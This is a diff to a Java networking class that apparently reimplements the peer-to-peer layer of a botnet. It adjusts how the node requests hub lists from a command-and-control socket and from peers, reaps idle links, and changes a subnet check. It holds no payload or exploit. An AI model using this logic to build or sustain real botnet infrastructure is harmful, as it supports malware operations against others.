@@ -98,11 +98,6 @@ public class ThreadServer implements Runnable {
 
         port = config.packet.getByName("PORT").asWord();
 
-        // XXX: Hack for running not as sudo right now...
-        if (port < 1024) {
-            port += 1024;
-        }
-
         // Extracted out so I can selectively override them
         createP2PListen();
         createUDPMixer();
@@ -193,19 +188,21 @@ public class ThreadServer implements Runnable {
             udpList.clearExpired();
             saveHubList();
             saveUDPHubList();
-            P2PLink p2pLink;
-            if ((hubList.getCandidateCount() < 5) || (udpList.getCandidateCount() < 5)) {
+            // CheckHub() in the bot: ask the C&C for more hubs when we know fewer than 100 or have fewer
+            // than 5 candidates...
+            if ((hubList.count() < 100) || (hubList.getCandidateCount() < 5)) {
                 if ((socks != null) && socks.isConnected()) {
                     socks.sendGetHubList();
                 }
+            }
 
-                if ((hubList.count() < 100) || (hubList.getCandidateCount() < 100) || (udpList.count() < 100)
-                                || (udpList.getCandidateCount() < 5)) {
-                    for (int i = 0; i < p2plist.getCount(); i++) {
-                        p2pLink = p2plist.getByIndex(i);
-                        if (p2pLink.isConnected()) {
-                            p2pLink.sendGetHubList();
-                        }
+            // ...and ask every connected peer unless we already have plenty of everything
+            if ((hubList.getCandidateCount() < 100) || (hubList.count() < 100) || (udpList.getCandidateCount() < 5)
+                            || (udpList.count() < 1000)) {
+                for (int i = 0; i < p2plist.getCount(); i++) {
+                    P2PLink p2pLink = p2plist.getByIndex(i);
+                    if (p2pLink.isConnected()) {
+                        p2pLink.sendGetHubList();
                     }
                 }
             }
@@ -216,11 +213,20 @@ public class ThreadServer implements Runnable {
         if ((lastCheckP2P + 10000L) < System.currentTimeMillis()) {
             lastCheckP2P = System.currentTimeMillis();
 
-            for (int i = 0; i < p2plist.getCount(); i++) {
-                if (p2plist.getByIndex(i).isConnected()) {
-                    if ((p2plist.getByIndex(i).lastConnect + 15000L) > lastCheckP2P) {
-                        p2plist.getByIndex(i).close();
-                    }
+            // Reap links that never got (or lost) a working session and have been idle for 15s. Closing
+            // removes the link from the list, so the same index is looked at again - unless close() did
+            // not remove it, which must not spin forever.
+            int linkIndex = 0;
+            while (linkIndex < p2plist.getCount()) {
+                P2PLink existing = p2plist.getByIndex(linkIndex);
+                boolean advance = true;
+                if (!existing.isConnected() && ((existing.lastUsedTime + 15000L) < lastCheckP2P)) {
+                    int before = p2plist.getCount();
+                    existing.close();
+                    advance = p2plist.getCount() >= before;
+                }
+                if (advance) {
+                    linkIndex++;
                 }
             }
 
@@ -229,14 +235,14 @@ public class ThreadServer implements Runnable {
                 if (item.ip.equals(ip) && (item.port == port)) {
                     item.used = true;
                 } else {
-                    if (!p2plist.checkSubnet(item.ip)) {
+                    if (p2plist.checkSubnet(item.ip)) {
                         item.used = true;
                         item.lastTested = lastCheckP2P;
-                        item.lastConnect = lastCheckP2P;
                         item.connectCount++;
 
                         P2PLink p2pLink = new P2PLink(this);
                         p2pLink.hr = item;
+                        p2pLink.lastUsedTime = lastCheckP2P;
                         p2pLink.connect(new InetSocketAddress(item.ip, (int) item.port));
 
                         p2plist.add(p2pLink);
